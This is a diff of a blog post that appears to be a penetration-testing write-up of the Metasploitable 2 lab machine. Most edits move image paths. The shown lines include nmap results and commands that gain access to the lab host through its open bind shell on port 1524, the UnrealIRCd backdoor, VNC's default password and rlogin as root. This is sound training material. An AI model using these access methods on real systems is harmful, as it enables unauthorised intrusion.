@@ -1,15 +1,18 @@
 ---
 layout: post
 title:  Hacking Metasploitable 2
+subtitle: Conducting a penetration testing on Metasploitable 2.
 date:   2022-05-11
-updated: 
-pin: false
-tags: [hacking, cybersecurity]
-splash_img_source: /assets/img/metasploitable2.png
-splash_img_caption: Conducting a penetration testing on Metasploitable 2.
+tags: [writeup, cybersecurity]
+author: Patrick Castro
+comments: True
 ---
 
+>This is how I conducted VAPT on Metasploitable machine.
+
 # Metasploitable 2
+
+![](/assets/img/metasploitable2/metasploitable2.png)
 
 ***
 
@@ -100,8 +103,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 130.90 seconds
 ```
 
+<br>
+
 ### 2. Checking the Web interface
-![](/assets/img/Pasted image 20220510102031.png)
+![](/assets/img/metasploitable2/Pasted image 20220510102031.png)
 
 <br>
 
@@ -110,6 +115,7 @@ Nmap done: 1 IP address (1 host up) scanned in 130.90 seconds
 - Interesting services and ports from nmap results
 
 ```
+PORT      STATE SERVICE     VERSION
 - 21/tcp    open  ftp         vsftpd 2.3.4
 - 22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 - 23/tcp    open  telnet      Linux telnetd
@@ -168,7 +174,7 @@ The port of open shell (obtained from nmap): `1524`
 nc 192.168.179.134 1524
 ```
 
-![](/assets/img/Pasted image 20220511175156.png)
+![](/assets/img/metasploitable2/Pasted image 20220511175156.png)
 
 ### 2. Gain access using UnrealIRCd Backdoor | Metasploit
 **Vulnerability:** UnrealIRCd Backdoor Detection
@@ -188,10 +194,10 @@ RPORT: `6697`
 2   payload/cmd/unix/bind_ruby      normal  No     Unix Command Shell, Bind TCP (via Ruby)
 ```
 
-![](/assets/img/Pasted image 20220511182620.png)
+![](/assets/img/metasploitable2/Pasted image 20220511182620.png)
 
 **Exploit:**
-![](/assets/img/Pasted image 20220511182700.png)
+![](/assets/img/metasploitable2/Pasted image 20220511182700.png)
 
 ### 3.  Gain access using vnc 
 **Vulnerability:** VNC Server 'password' Password
@@ -208,13 +214,13 @@ The IP of the target: `192.168.179.134`
 vncviewer 192.168.179.134:5900
 ```
 
-![](/assets/img/Pasted image 20220511183852.png)
+![](/assets/img/metasploitable2/Pasted image 20220511183852.png)
 
 **Password:** `password` (based from the Nessus scan)
 
-![](/assets/img/Pasted image 20220511183957.png)
+![](/assets/img/metasploitable2/Pasted image 20220511183957.png)
 
-![](/assets/img/Pasted image 20220511184043.png)
+![](/assets/img/metasploitable2/Pasted image 20220511184043.png)
 
 ### 4. Gain access using rlogin
 **Vulnerability:** rexecd Service Detection
@@ -230,7 +236,10 @@ vncviewer 192.168.179.134:5900
 rlogin -l root 192.168.179.134
 ```
 
-![](/assets/img/Pasted image 20220511190005.png)
+![](/assets/img/metasploitable2/Pasted image 20220511190005.png)
 
+***
+
+That's all, thank you for reading.
 
 
